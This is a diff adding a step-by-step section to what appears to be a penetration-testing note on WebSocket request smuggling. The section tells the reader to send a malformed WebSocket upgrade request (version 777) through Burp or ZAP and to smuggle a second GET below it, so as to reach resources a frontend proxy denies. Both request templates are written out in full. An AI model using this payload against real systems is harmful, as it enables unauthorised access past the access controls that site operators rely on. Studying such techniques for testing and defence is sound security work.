@@ -18,3 +18,44 @@
 
 ### It is important to note that this technique won't allow us to poison other users' backend connections. We will be limited to tunnelling requests through the proxy only, so we can bypass any restrictions imposed by the frontend proxy by using this trick.
 
+## Steps to abuse:
+
+#### 1) Find a resource that thr proxy denies access to.
+
+#### 2) Burpsuite or OWASP ZAP
+
+#### 3) Find the WebSocket endpoint (if it speaks WebSocket)
+
+## Request: 
+
+GET /socket HTTP/1.1
+Host: IP_ADDRESS:PORT
+Sec-WebSocket-Version: 777
+Upgrade: WebSocket
+Connection: Upgrade
+Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==
+
+#### 4) Send to repeater
+
+#### 5) Disable Update Content-Length to not break the attack
+
+#### 6) Smuggle another HTTP request below the one we just created (The resource we want to access)
+
+## Example: 
+
+GET /socket HTTP/1.1
+Host: IP_ADDRESS:PORT
+Sec-WebSocket-Version: 777
+Upgrade: WebSocket
+Connection: Upgrade
+Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==
+
+
+
+GET /RESOURCE HTTP/1.1
+Host: IP_ADDRESS:PORT
+
+
+## TIP: DON'T FORGET TO PRESS ENTER TWICE AFTER THE SMUGGLED HTTP REQUEST TO MAKE THIS ATTACK WORK
+
+#### 7) Send the request to access the restricted content
